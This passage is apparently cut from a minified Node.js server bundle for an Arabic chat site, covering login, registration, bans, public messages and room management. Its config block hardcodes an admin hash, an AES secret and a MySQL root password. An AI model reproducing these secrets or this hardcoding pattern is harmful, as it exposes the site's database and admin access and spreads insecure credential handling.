            r = s.getHours() + ":" + s.getMinutes() + ":" + s.getSeconds() + "  =>  " + t.type + "  =>  " + e.name + "  =>  " + e.ip + "\r\n" + JSON.stringify(t) + "\r\n****************************************************************************\r\n";
        v.appendFile("reg_user_events/" + e.id + "_" + e.name + ".txt", r, (function(e) {}))
    }, S.prototype.isValidToken = function(e) {
        return !!this.store.adminTokens.filter(t => t == e)[0]
    }, S.prototype.isValidAdminHash = function(e) {
        return this.store.config.adminHash == e
    }, S.prototype.isBanned = function(e) {
        return !e.isTrusted && (!!e.isBanned || (this.store.bannedIps.indexOf(e.ip) >= 0 || this.store.bannedDevices.indexOf(e.device) >= 0 || this.store.bannedDeviceUUIDs.indexOf(e.deviceUUID) >= 0))
    }, S.prototype.isMuted = function(e) {
        return !!e.isMuted || this.store.mutedIps.indexOf(e.ip) >= 0 || this.store.mutedDevices.indexOf(e.device) >= 0
    }, e.exports = S
}, function(e, t, s) {
    const r = s(0);

    function i(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "SET_LOCATION":
                return this.setLocation(e.data);
            default:
                return null
        }
    }
    i.prototype.setLocation = function(e) {
        this.user.isVirtual && (this.user.ip = e.ip, this.user.device = e.device, this.user.country = e.country), "function" == typeof this.handler && this.handler()
    }, e.exports = i
}, function(e, t) {
    e.exports = require("crypto-js")
}, function(e, t) {
    e.exports = {
        host: "https://test-cases.site/",
        domain: "test-cases.site",
        port: 2083,
        adminHash: "bts0ek0JsR2wPkbBOXnINeFwUAoL5ODH",
        debug: !0,
        ssl: !0,
        local: !1,
        is_mic_enabled: !0,
        is_reg_enabled: !1,
        aes_secret: ">|Z2i580Py*4C3r",
        db: {
            host: "127.0.0.1",
            user: "root",
            password: "`w72S:wG{n?!f8yu",
            database: "abo_arishh_v3",
            charset: "utf8mb4"
        }
    }
}, function(e, t) {
    e.exports = require("request")
}, function(e, t, s) {
    s(4);
    const r = s(22),
        i = s(0),
        o = s(5),
        n = s(6);

    function a(e, t, s, r) {
        switch (this.socket = t, this.user = s, this.store = r, this.handler = e.handler, i.check(r, t), e.type) {
            case "GUEST_LOGIN":
                return this.guestLogin(e.data);
            case "MEMBER_LOGIN":
                return this.memberLogin(e.data);
            case "REGISTER_MEMBER":
                return this.registerMember(e.data);
            case "TRUST_USER":
                return this.trustUser(e.data);
            default:
                return null
        }
    }
    s(10), s(3), a.prototype.guestLogin = function(e) {
        const t = this.cantAuthenticate(!1);
        return null !== t ? (t.isBanned && (this.user.name = e.name, this.user.role = this.store.roles.getRoleIdByType("guest"), this.store.loginBanneds.register(this.user, "guest_login")), this.handler(i.enc(t))) : this.store.wordsFilter.check(e.name, null, this.handler, "هذا الإسم يحتوي على كلمات ممنوعة") ? void 0 : (e.name = i.sanitize(e.name), e.name ? e.name.length < 2 ? this.handler(i.enc({
            error: !0,
            message: "إسم المستخدم لا يجب أن يقل عن حرفين"
        })) : this.isUsernameTaken(e.name) ? this.handler(i.enc({
            error: !1,
            message: "هدا الإسم محجوز, الرجاء إختيار إسم آخر"
        })) : void this.store.db.query("SELECT * FROM users WHERE name = ? limit 1", [e.name], (t, s) => {
            if (s.length) return this.handler(i.enc({
                error: !0,
                message: "هدا الإسم محجوز, الرجاء إختيار إسم آخر"
            }));
            try {
                if (!this.isCountryAllowed(this.user.country, this.store.settings.get("bolcked_countries", this.user.getDomain()), !!this.store.settings.get("disable_foreing_contries", this.user.getDomain()))) return this.handler(i.enc({
                    error: !0,
                    message: "لقد تم حظر دولتك"
                }));
                this.handleMutliSessions(), this.user.init(e), this.store.settings.get("guests_default_room", this.user.getDomain()) && !this.store.settings.get("is_public_room_default", this.user.getDomain()) ? this.user.room = this.store.rooms.get(this.store.settings.get("guests_default_room", this.user.getDomain())) : this.user.room = this.store.rooms.getDefault(this.user, this.store.users), this.store.rooms.get(this.user.room.id).users.push(this.user.id), this.store.users.push(this.user), this.isUserMuted() && (this.user.isMuted = !0), this.user.socket.broadcast.emit("res", i.enc({
                    type: "NEW_USER",
                    data: {
                        user: this.user.parse()
                    }
                })), this.handleDisconnection(), this.store.revealNames.register(this.user).catch(e => {}), this.handler(i.enc({
                    error: !1,
                    grantedSettings: this.user.grantedSettings(),
                    posts: this.store.wall.all(),
                    rooms: this.store.rooms.all().map(e => e.parse(this.user, this.store.users)),
                    users: this.store.users.filter(e => e.isMuted && e.id == this.user.id || !e.isMuted).filter(e => e.canBeSeenBy(this.user)).map(e => e.parse()),
                    gifts: this.store.gifts.all(),
                    faces: this.store.faces.all(),
                    actions: [],
                    roles: [],
                    userBackgrounds: [],
                    userAvatarBackgrounds: [],
                    privateMessages: [],
                    shortcuts: {
                        values: this.store.shortcuts.values(),
                        keys: this.store.shortcuts.keys()
                    },
                    user: this.user.parse()
                })), this.store.greetingMessages.greet(this.user)
            } catch (e) {}
        }) : this.handler(i.enc({
            error: !0,
            message: "الرجاء التأكد من إدخال الإسم"
        })))
    }, a.prototype.memberLogin = function(e) {
        const t = this.cantAuthenticate(!0);
        return null !== t ? this.handler(i.enc(t)) : (e.name = i.sanitize(e.name), e.name && e.password ? e.name.length < 2 ? this.handler(i.enc({
            error: !0,
            message: "إسم المستخدم لا يجب أن يقل عن حرفين"
        })) : void this.store.db.query("SELECT * FROM users WHERE name = ? limit 1", [e.name], (t, s) => {
            if (!s || !s.length) return this.handler(i.enc({
                error: !0,
                message: "الرجاء التأكد من صحة البيانات"
            }));
            try {
                if (!r.compareSync(e.password, s[0].password)) return this.handler(i.enc({
                    error: !0,
                    message: "الرجاء التأكد من صحة البيانات"
                }));
                let t = this.store.users.filter(e => e.reg_id == s[0].id)[0],
                    n = [];
                t && (n = t.privateMessages, this.store.users = this.store.users.filter(e => e.reg_id != t.reg_id), this.user.isHidden = !1, t.logout());
                let a = s[0];
                a.hidden = !!e.hidden, this.user.isTrusted = !!a.is_trusted, this.user.fixedLogin = !!a.fixed_login, this.user.royalLogin = !!a.royal_login, this.user.name = a.name, this.user.reg_id = a.id, this.user.role = a.role_id, this.user.decoration = a.decoration, this.user.subscription_end = a.subscription_end, this.user.oldSocketId = a.old_socket_id, this.user.privateMessages = n;
                let u = !1;
                if (this.isSubscriptionEnded(a.subscription_end) && !a.permanent_subscription && (this.user.role = a.role_id = this.store.roles.getRoleIdByType("basic"), u = !0), this.isUserBanned()) return this.store.loginBanneds.register(this.user, "member_login"), this.handler(i.enc({
                    error: !0,
                    message: "لقد تم حظرك من الدردشة, الرجاء الإنتظار قليلا حتى يتم توثيق عضويتك"
                }));
                if (!this.isCountryAllowed(this.user.country, this.store.settings.get("bolcked_countries", this.user.getDomain()), !!this.store.settings.get("disable_foreing_contries", this.user.getDomain()))) return this.handler(i.enc({
                    error: !0,
                    message: "لقد تم حظر دولتك"
                }));
                if (this.handleMutliSessions(), this.user.init(this.parseUser(a)), this.user.isHidden && !this.user.has("hidden")) return this.user.isLogged = !1, this.handler(i.enc({
                    error: !0,
                    message: "لا تملك صلاحيات الدخول المخفي"
                }));
                var o = !1;
                let c = null,
                    d = this.store.rooms.getDefault(this.user, this.store.users);
                this.isUserMuted() ? this.user.isMuted = !0 : (this.user.fixedLogin || this.store.settings.get("is_fixed_login_enabled", this.user.getDomain())) && t && t.room ? ((c = this.store.rooms.get(t.room.id)) && (c.users = c.users.filter(e => e != this.user.oldSocketId)), c && !c.isFull(this.user, this.store.users) ? (o = !0, this.user.room = c) : this.user.getReputation() < d.required_likes && this.store.settings.get("members_default_room", this.user.getDomain()) && !this.store.settings.get("is_public_room_default", this.user.getDomain()) ? this.user.room = this.store.rooms.get(this.store.settings.get("members_default_room", this.user.getDomain())) : this.user.room = d) : this.user.getReputation() < d.required_likes && this.store.settings.get("members_default_room", this.user.getDomain()) && !this.store.settings.get("is_public_room_default", this.user.getDomain()) ? this.user.room = this.store.rooms.get(this.store.settings.get("members_default_room", this.user.getDomain())) : this.user.room = d;
                const h = this.store.users.filter(e => e.name == this.user.name && e.id != this.user.id)[0];
                h && h.logout(), this.store.users.push(this.user), o || this.store.rooms.get(this.user.room.id).users.push(this.user.id), this.isUserMuted() && (this.user.isMuted = !0), this.store.users.filter(e => !e.isVirtual && e.id != this.user.id && this.user.canBeSeenBy(e)).forEach(e => {
                    e.socket.emit("res", i.enc({
                        type: "NEW_USER",
                        data: {
                            user: this.user.parse()
                        }
                    }))
                }), this.store.settings.get("is_fixed_login_enabled", this.user.getDomain()) || (this.store.users = this.store.users.filter(e => e.fixedLogin || e.socket && e.socket.connected ? e : void 0)), this.user.adminToken && this.store.adminTokens.push(this.user.adminToken), this.handleDisconnection(), this.user.isVirtual ? (this.store.virtualUserIds.push(this.user.reg_id), this.handler(this.user.defaultRoom)) : (this.store.revealNames.register(this.user).catch(e => {}), this.handler(i.enc({
                    error: !1,
                    cookie: e,
                    grantedSettings: this.user.grantedSettings(),
                    posts: this.store.wall.all(),
                    rooms: this.store.rooms.all().map(e => e.parse(this.user, this.store.users)),
                    users: this.store.users.filter(e => e.isMuted && e.id == this.user.id || !e.isMuted).filter(e => e.canBeSeenBy(this.user)).map(e => e.parse()),
                    gifts: this.store.gifts.all(),
                    faces: this.store.faces.all(),
                    actions: this.user.actions(),
                    roles: this.store.roles.all(this.store.permissions.getUpgradableRoles(this.user.role)),
                    userBackgrounds: this.store.userBackgrounds.all(),
                    userAvatarBackgrounds: this.store.userAvatarBackgrounds.all(),
                    shortcuts: {
                        values: this.store.shortcuts.values(),
                        keys: this.store.shortcuts.keys()
                    },
                    user: this.user.parse(),
                    privateMessages: this.user.privateMessages,
                    isSubscriptionEnded: u
                })), this.store.greetingMessages.greet(this.user), this.user.privateMessages = [], this.store.notifications.filter(e => e.targetUser == this.user.reg_id).forEach(e => {
                    this.user.socket.emit("res", i.enc({
                        type: "PROFILE_ACTION_NOTIFY",
                        data: e
                    }))
                }), this.store.notifications = this.store.notifications.filter(e => e.targetUser != this.user.reg_id), this.store.disconnectTimeOuts[this.user.reg_id] && clearTimeout(this.store.disconnectTimeOuts[this.user.reg_id]), this.store.db.query("UPDATE users SET `old_socket_id` = ?, is_trusted = 1, role_id = ?, `ip` = ?, `device` = ?, `device_uuid` = ?, `country` = ?, `last_login` = ?, `adminToken` = ? WHERE id = ?", [this.user.id, this.user.role, this.user.ip, this.user.device, this.user.deviceUUID, this.user.country, new Date, this.user.adminToken, this.user.reg_id], (e, t) => {}))
            } catch (e) {
                console.log(e)
            }
        }) : this.handler(i.enc({
            error: !0,
            message: "الرجاء التأكد من إدخال الإسم و كلمة المرور"
        })))
    }, a.prototype.registerMember = function(e) {
        if (this.store.settings.get("disable_signup", this.user.getDomain())) {
            const e = {
                error: !0,
                message: "تم إغلاق التسجيل مؤقتا, الرجاء إعادة المحاولة لاحقا"
            };
            return this.handler(i.enc(e))
        }
        if (e.name = i.sanitize(e.name), e.adminHash = this.store.config.adminHash, e.country = this.user.country, e.ip = this.user.ip, e.device = this.user.device, e.deviceUUID = this.user.deviceUUID, !this.store.wordsFilter.check(e.name, null, this.handler, "هذا الإسم يحتوي على كلمات ممنوعة")) return this.isCountryAllowed(this.user.country, this.store.settings.get("bolcked_countries", this.user.getDomain()), !!this.store.settings.get("disable_foreing_contries", this.user.getDomain())) ? void this.store.db.query("SELECT * FROM users WHERE name = ? limit 1", [e.name], (t, s) => {
            if (t) return this.handler(i.enc({
                error: !0,
                message: "حدث خطأ أثناء تسجيل الحساب, الرجاء إعادة المحاولة"
            }));
            if (s.length) return this.handler(i.enc({
                error: !0,
                message: "هدا الإسم محجوز, الرجاء إختيار إسم آخر"
            }));
            try {
                let t = this.store.roles.getRoleIdByType("basic"),
                    s = r.hashSync(e.password);
                this.store.db.query("INSERT INTO users (`name`, `password`, `country`, `device`, `device_uuid`, `ip`, `role_id`, `created_at`, `updated_at`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", [e.name, s, e.country, e.device, e.deviceUUID, e.ip, t, new Date, new Date], (e, t) => {
                    if (e) return this.handler(i.enc({
                        error: !0,
                        message: "حدث خطأ أثناء تسجيل الحساب, الرجاء إعادة المحاولة"
                    }));
                    t && t.affectedRows && this.handler(i.enc({
                        error: !1,
                        message: "تمت عملية التسجيل بنجاح"
                    }))
                })
            } catch (e) {}
        }) : this.handler(i.enc({
            error: !0,
            message: "لقد تم حظر دولتك"
        }))
    }, a.prototype.trustUser = function(e) {
        if (e && e.id) {
            if (!this.user.can("admin_banneds_remove", this.handler, !0)) return;
            this.store.db.query("UPDATE users SET is_trusted = 1 WHERE id = ?", [e.id], (t, s) => {
                if (t) return this.handler(i.enc({
                    error: !0,
                    message: "حدث خطأ أثناء توثيق العضوية"
                }));
                if (s && s.affectedRows) {
                    if (s.changedRows) {
                        const t = new Date;
                        this.store.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, updated_at, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", [this.user.name, this.user.getUsername(), e.name, e.decoration, "عملية توثيق العضوية", "trust-member", t, t], (e, t) => {})
                    }
                    return this.handler(i.enc({
                        error: !1,
                        message: "تم توثيق العضوية بنجاح"
                    }))
                }
            })
        }
    }, a.prototype.updateYoucamLudo = function() {
        if (this.user.room && this.user.room.ludoGameState.players && this.user.room.ludoGameState.players.length && (this.user.room.ludoGameState.players = this.user.room.ludoGameState.players.filter(e => e.user_id != this.user.id), this.user.room.ludoGameState.players.length < 2)) {
            if (1 == this.user.room.ludoGameState.players.length) {
                let e = this.store.users.filter(e => e.id == this.user.room.ludoGameState.players[0].user_id)[0];
                e && (e.ludoGame = null, e.isPlaying = !1)
            }
            this.user.room.ludoGame = null, this.user.room.ludoGameState = {}
        }
    }, a.prototype.handleDisconnection = function() {
        this.socket.on("disconnect", () => {
            if (this.updateYoucamLudo(), (this.user.fixedLogin || this.store.settings.get("is_fixed_login_enabled", this.user.getDomain())) && !this.user.isGuest() && !this.user.isBanned && !this.user.isExcpeled && !this.user.isMuted) {
                this.user.oldRoom = this.user.room ? this.user.room.parse() : null, this.leaveRoom(!0), this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(e => {
                    e.socket.emit("res", i.enc({
                        type: "USER_OUT",
                        data: {
                            user: this.user.parse()
                        }
                    }))
                });
                let e = this.store.users.filter(e => e.id != this.user.id && e.socket && !e.socket.connected);
                return e.length && e.length >= this.store.settings.get("fixed_login_count", this.user.getDomain()) && this.clear(!0, e[0]), this.store.disconnectTimeOuts[this.user.reg_id] = setTimeout(() => {
                    this.clear(!0)
                }, 864e5)
            }
            this.clear()
        })
    }, a.prototype.clear = function(e, t) {
        if (t || (t = this.user), this.store.users.filter(e => t.canBeSeenBy(e)).forEach(s => {
                s.socket.emit("res", i.enc({
                    type: "USER_OUT",
                    data: {
                        user: t.parse(),
                        force: e
                    }
                }))
            }), t.callUserId) {
            const e = this.store.users.filter(e => e.id == t.callUserId)[0];
            e && (e.callStatus = n.READY, e.socket.emit("res", i.enc({
                type: "CALL_REQUEST_CANCELLED",
                data: {}
            })))
        }
        t.save(), t.room && (t.room.users = t.room.users.filter(e => e != t.id), t.room.micUsers.filter(e => e.user_id == t.id)[0] && (t.room.micUsers = t.room.micUsers.filter(e => e.user_id != t.id)), t.room.removeWhenEmpty && t.room.usersCount() <= 0 && (this.store.io.emit("res", i.enc({
            type: "ADMIN_ROOM_DELETED",
            data: {
                ids: [t.room.id]
            }
        })), this.store.rooms.remove(t.room.id, !0))), this.botBrbRemoveParticipant(t), t.adminToken && (this.store.adminTokens = this.store.adminTokens.filter(e => e != t.adminToken)), t.isVirtual && (this.store.virtualUserIds = this.store.virtualUserIds.filter(e => e != t.reg_id)), this.store.users = this.store.users.filter(e => e.id != t.id), this.resetHashTag(), t.loggedOutAt = Date.now(), this.store.usersReg.push(t)
    }, a.prototype.botBrbRemoveParticipant = function(e) {
        if (!e.room) return;
        let t = this.store.bots_brb.filter(t => t.room_id == e.room.id)[0];
        t && t.removeParticipant(e)
    }, a.prototype.resetHashTag = function() {
        this.user.reg_id && (this.store.hashTags = this.store.hashTags.map(e => (e.user_id == this.user.reg_id && (e.user_id = null), e)))
    }, a.prototype.leaveRoom = function(e) {
        this.user.room && (this.user.room.users = this.user.room.users.filter(e => this.user.id != e), this.user.room.micUsers.filter(e => e.user_id == this.user.id)[0] && (this.user.room.micUsers = this.user.room.micUsers.filter(e => e.user_id != this.user.id)), this.user.room.removeWhenEmpty && this.user.room.usersCount() <= 0 && (this.store.io.emit("res", i.enc({
            type: "ADMIN_ROOM_DELETED",
            data: {
                ids: [this.user.room.id]
            }
        })), this.store.rooms.remove(this.user.room.id, !0)));
        const t = this.user.room ? this.user.room : null;
        if (this.user.room = null, e) {
            const e = {
                room: null
            };
            this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(s => {
                let r = t ? t.parse(s, this.store.users) : null;
                s.socket.emit("res", i.enc({
                    type: "USER_LEAVED_ROOM",
                    data: {
                        user: this.user.parse(),
                        oldRoom: r
                    }
                })), s.socket.emit("res", i.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: this.user.id,
                        reg_id: this.user.reg_id,
                        updates: e
                    }
                }))
            })
        }
    }, a.prototype.handleMutliSessions = function() {
        this.store.settings.get("allow_multi_sessions", this.user.getDomain()) || this.store.users.map(e => {
            e.device == this.user.device && e.id != this.user.id && e.logout()
        })
    }, a.prototype.cantAuthenticate = function(e) {
        try {
            const t = {
                error: !0,
                message: null
            };
            return this.user.isLogged ? t : this.isUserBanned() && !e ? (t.message = "لقد تم حظرك من الدردشة", t.isBanned = !0, t) : this.store.settings.get("disable_guest_login", this.user.getDomain()) && !e ? (t.message = "الرجاء تسجيل عضوية و التفضل بالدخول من فضلكم", t) : !this.store.config.local && this.store.loggedIps[this.user.ip] > 5 ? (t.message = "لا يمكن دخول أكثر من 5 أشخاص من نفس الأيبي", t) : null
        } catch (e) {
            return console.log(e.stack), null
        }
    }, a.prototype.parseUser = function(e) {
        const t = {};
        if (!t) return t;
        t.name = e.name, t.hidden = e.hidden, t.decoration = e.decoration, t.id = e.id, t.ip = this.user.ip, t.role = e.role_id, t.gift = e.gift, t.fontSize = e.fontSize, t.fontColor = e.fontColor, t.statusColor = e.statusColor, t.nameColor = e.nameColor, t.nameBgColor = e.nameBgColor, t.reputation = e.reputation, t.status = e.status, t.avatar = e.avatar ? e.avatar.replace("uploads/avatars/", "") : null, t.background = e.background, t.avatar_background = e.avatar_background, t.isVirtual = e.is_virtual, t.isTrusted = e.is_trusted, t.defaultRoom = e.default_room, t.isPrivateDisabled = !!e.isPrivateDisabled, t.isNotificationsDisabled = !!e.isNotificationsDisabled, t.isRoleIconHidden = !!e.isRoleIconHidden, t.isPrivateBipEnabled = !!e.isPrivateBipEnabled, t.wallPoints = e.wall_points, e.status && e.status.length ? t.status = e.status : (new Date - new Date(e.created_at)) / 864e5 > 3 ? t.status = "(لا يوجد)" : t.status = "(عضو جديد)", t.orders_excpel = e.orders_excpel, t.orders_ban = e.orders_ban, t.orders_notify = e.orders_notify, t.orders_gift = e.orders_gift, t.orders_remove_avatar = e.orders_remove_avatar, t.orders_change_decoartion = e.orders_change_decoartion, t.orders_excpel_from_room = e.orders_excpel_from_room, t.room_create = e.room_create, t.room_edit = e.room_edit, t.room_remove = e.room_remove, t.room_max_pertinents = e.room_max_pertinents, t.send_ad = e.send_ad, t.wall_remove = e.wall_remove, t.wall_interval = e.wall_interval, t.public_msg_remove = e.public_msg_remove;
        let s = null;
        return this.store.permissions.isAutorized("admin", e.role_id) && (s = o.str_random(24)), t.adminToken = s, t.country = this.user.country, t
    }, a.prototype.isCountryAllowed = function(e, t, s) {
        try {
            let r = ["dz", "eg", "sd", "iq", "ma", "sa", "ye", "sy", "tn", "so", "jo", "ae", "ly", "ps", "lb", "om", "kw", "mr", "qa", "bh", "dj", "tr"];
            if (e = e.toLowerCase(), s && r.indexOf(e) < 0) return !1;
            if (t) {
                let s = [];
                if ((t = t.split("\n").map(e => e.toLowerCase())).forEach(e => {
                        s.push(e.replace(["\n", "\t", "\r"], ""))
                    }), s.indexOf(e) >= 0) return !1
            }
            return !0
        } catch (e) {
            return !1
        }
    }, a.prototype.isUserBanned = function() {
        return !this.user.isTrusted && (!!this.user.isBanned || (this.store.bannedIps.indexOf(this.user.ip) >= 0 || this.store.bannedDevices.indexOf(this.user.device) >= 0 || this.store.bannedDeviceUUIDs.indexOf(this.user.deviceUUID) >= 0))
    }, a.prototype.isSubscriptionEnded = function(e) {
        if (!e) return !1;
        const t = new Date,
            s = new Date(e),
            r = Math.abs(s - t);
        let i = Math.ceil(r / 864e5);
        return i > 0 && (i -= 1), !(i > 0)
    }, a.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, a.prototype.isUsernameTaken = function(e) {
        const t = this.store.users.filter(t => t.name == e)[0];
        return t && t.socket
    }, e.exports = a
}, function(e, t) {
    e.exports = require("bcryptjs")
}, function(e, t) {
    e.exports = require("geoip-lite")
}, function(e, t, s) {
    const r = s(0);

    function i(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "NEW_PUBLIC_MESSAGE":
                return this.onNewMessage(e.data);
            case "REMOVE_PUBLIC_MESSAGE":
                return this.removeMessage(e.data);
            default:
                return null
        }
    }
    s(3), i.prototype.checkBotBrb = function(e) {
        if ("brb" == e.toLowerCase() || "برب" == e) {
            let e = this.store.bots_brb.filter(e => e.room_id == this.user.room.id)[0];
            e && e.isStarted && e.isCountdownReady && e.start(this.user.parse())
        }
    }, i.prototype.onNewMessage = function(e) {
        if (!this.canSendPublicMessages()) return;
        if (this.user.lastMessage && this.user.lastMessage.isPublic && Date.now() - 1e3 * this.store.settings.get("time_between_messages", this.user.getDomain()) < this.user.lastMessage.time) return;
        if (!this.user.room) return;
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        const t = {
            type: "NEW_PUBLIC_MESSAGE",
            data: {
                time: Date.now(),
                user: this.user.parse(),
                reply: e.reply,
                message: r.sanitize(e.message, this.store.shortcuts, this.store.settings.get("public_msg_length", this.user.getDomain()))
            }
        };
        setTimeout(() => {
            this.isUserMuted() ? this.store.users.filter(e => e.room && this.user.room && e.room.id == this.user.room.id && e.id != this.user.id && this.user.ip == e.ip).forEach(e => {
                e.socket.emit("res", r.enc(t))
            }) : this.store.users.filter(e => e.room && this.user.room && e.room.id == this.user.room.id && e.id != this.user.id).forEach(e => {
                e.socket.emit("res", r.enc(t))
            }), this.handler(r.enc(t)), this.checkBotBrb(e.message), this.user.lastMessage = {
                time: Date.now(),
                isPublic: !0,
                isPrivate: !1,
                msg: e.message
            }
        }, 150)
    }, i.prototype.canSendPublicMessages = function() {
        const e = this.store.settings.get("required_likes_public", this.user.getDomain());
        return !(this.user.getReputation() < e && (this.handler(r.enc("يجب أن تتوفر على " + e + " إعجاب حتى تتمكن من القيام بهذه العملية")), 1))
    }, i.prototype.removeMessage = function(e) {
        if (e.id) {
            if (!this.user.can("public_msg_remove", this.handler)) return;
            if (this.store.io.emit("res", r.enc({
                    type: "REMOVE_PUBLIC_MESSAGE",
                    data: {
                        id: e.id
                    }
                })), e.is_ad) {
                const t = new Date;
                this.store.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, updated_at, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", [this.user.name, this.user.getUsername(), "/", "/", e.message, "ad-remove", t, t], (e, t) => {})
            }
        }
    }, i.prototype.register = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.store.db.query("INSERT INTO publicMsg (byRealName, byNickName, msg, created_at, updated_at) VALUES (?,?,?,?,?)", [t.user.name, t.user.getUsername(), e, new Date, new Date], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, i.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0);

    function i(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "JOIN_ROOM":
                return this.joinRoom(e.data);
            case "LEAVE_ROOM":
                return this.leaveRoom(e.data, !0);
            case "CREATE_ROOM":
                return this.createRoom(e.data);
            case "EDIT_ROOM":
                return this.editRoom(e.data);
            case "REMOVE_ROOM":
                return this.removeRoom(e.data);
            default:
                return null
        }
    }
    i.prototype.joinRoom = function(e) {
        const t = {
                error: !0,
                message: null
            },
            s = this.store.rooms.get(e.id);
        if (!s) return this.handler(r.enc(t));
        if (this.user.isGuest() && this.store.settings.get("members_default_room") == s.id) return t.message = "هذه الغرفة مخصصة للأعضاء", this.handler(r.enc(t));
        if (this.user.getReputation() < s.required_likes && this.store.settings.get("enable_required_likes_to_enter_rooms")) return t.message = "يجب أن تتوفر على " + s.required_likes + " إعجاب حتى تتمكن من الدخول إلى هذه الغرفة", this.handler(r.enc(t));
        if (!this.user.isSuper() && "supers" == s.target) return t.message = "هذه الغرفة مخصصة للسوابر فقط", this.handler(r.enc(t));
        if (this.user.excpeledFromRooms.includes(s.id)) return t.message = "تم طردك من هذه الغرفة", this.handler(r.enc(t));
        if (this.user.room && this.user.room.id == s.id) return this.handler(r.enc(t));
        if (s.isFull(this.user, this.store.users) && !this.user.canJoinFullRooms()) return t.message = "هده الغرفة ممتلئة", this.handler(r.enc(t));
        if (s.password && s.password != e.password && !this.user.canJoinLockedRooms()) return t.message = "الرجاء إدخال كلمة المرور الصحيحة", this.handler(r.enc(t));
        const i = this.user.room;
        this.leaveRoom(!1), s.users.push(this.user.id), this.user.room = s, this.store.settings.get("is_mic_enabled") && (this.store.settings.get("mic_room") || this.store.radio.startListening(this.user), this.store.settings.get("mic_room") == this.user.room.id && this.store.radio.startListening(this.user)), this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(e => {
            e.socket.emit("res", r.enc({
                type: "USER_JOINDED_ROOM",
                data: {
                    user: this.user.parse(),
                    oldRoom: i ? i.parse(e, this.store.users) : null,
                    newRoom: s ? s.parse(e, this.store.users) : null
                }
            }))
        }), t.error = !1, t.message = "تم تغيير الغرفة بنجاح", this.handler(r.enc(t))
    }, i.prototype.leaveRoom = function(e) {
        this.user.room && (this.user.room.micUsers.filter(e => e.user_id == this.user.id)[0] && (this.user.room.micUsers = this.user.room.micUsers.filter(e => e.user_id != this.user.id)), this.user.room.users = this.user.room.users.filter(e => this.user.id != e), this.store.radio.unRequestMic(this.user), this.store.radio.stopListening(this.user), this.user.room.removeWhenEmpty && this.user.room.usersCount() <= 0 && (this.store.io.emit("res", r.enc({
            type: "ADMIN_ROOM_DELETED",
            data: {
                ids: [this.user.room.id]
            }
        })), this.store.rooms.remove(this.user.room.id, !0)), this.botBrbRemoveParticipant(this.user));
        const t = this.user.room ? this.user.room : null;
        if (this.user.room = null, e) {
            const e = {
                room: null
            };
            this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(s => {
                let i = t ? t.parse(s, this.store.users) : null;
                s.socket.emit("res", r.enc({
                    type: "USER_LEAVED_ROOM",
                    data: {
                        user: this.user.parse(),
                        oldRoom: i
                    }
                })), s.socket.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: this.user.id,
                        reg_id: this.user.reg_id,
                        updates: e
                    }
                }))
            });
            let s = t ? t.parse(this.user, this.store.users) : null;
            this.handler(r.enc({
                user: this.user.parse(),
                oldRoom: s
            }))
        }
    }, i.prototype.createRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            if (this.store.rooms.all().filter(t => t.name == e.room.name).length) return this.handler(r.enc({
                error: !0,
                message: "هذه الغرفة موجودة, الرجاء إختيار إسم آخر"
            }));
            if (!this.user.can("room_create", this.handler)) return;
            if (e.room.capacity = isNaN(parseInt(e.room.capacity)) ? 40 : parseInt(e.room.capacity), e.room.isPermanent) {
                if (!this.user.can("room_max_pertinents", this.handler)) return;
                this.store.rooms.insertToDB(e.room).then(t => {
                    e.room.id = t.insertId;
                    const s = this.store.rooms.add(e.room);
                    s && (this.publishAddedRoom(s), this.handler(r.enc({
                        error: !1
                    })), this.register(s.name, "add"))
                }).catch(e => {})
            } else {
                e.room.id = Date.now();
                const t = this.store.rooms.add(e.room);
                t && (this.publishAddedRoom(t), this.handler(r.enc({
                    error: !1
                })), this.register(t.name, "add"))
            }
        }
    }, i.prototype.editRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            const t = this.store.rooms.all().filter(t => t.id == e.room.id)[0];
            if (!t) return;
            if (e.room.name != t.name && this.store.rooms.all().filter(t => t.name == e.room.name).length) return this.handler(r.enc({
                error: !0,
                message: "هذه الغرفة موجودة, الرجاء إختيار إسم آخر"
            }));
            if (!this.user.can("room_edit", this.handler)) return;
            if (e.room.capacity = isNaN(parseInt(e.room.capacity)) ? 40 : parseInt(e.room.capacity), e.room.removeWhenEmpty) {
                const t = this.store.rooms.edit(e.room);
                t && (this.store.io.emit("res", r.enc({
                    type: "ROOMS_UPDATED",
                    data: {
                        rooms: [t.parse()]
                    }
                })), this.handler(r.enc({
                    error: !1
                })), this.register(t.name, "edit"))
            } else this.store.rooms.save(e.room).then(t => {
                const s = this.store.rooms.edit(e.room);
                s && (this.store.io.emit("res", r.enc({
                    type: "ROOMS_UPDATED",
                    data: {
                        rooms: [s.parse()]
                    }
                })), this.handler(r.enc({
                    error: !1
                })), this.register(s.name, "edit"))
